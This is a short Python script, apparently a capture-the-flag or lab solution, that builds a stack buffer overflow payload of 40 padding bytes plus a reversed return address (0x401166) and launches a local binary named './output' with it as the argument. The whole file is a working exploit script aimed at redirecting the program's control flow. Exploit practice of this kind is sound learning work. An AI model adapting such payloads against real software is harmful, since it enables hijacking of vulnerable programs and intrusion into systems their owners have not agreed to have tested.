import os

buff = 40*(b'x')
print("Current buff:", buff)


addr = bytearray.fromhex("401166")
print("Current addr:", addr)

addr.reverse()
print("Reversed addr:", addr)


buff += addr
print("Execute with buff:", buff)

os.execv('./output',['./output', buff])
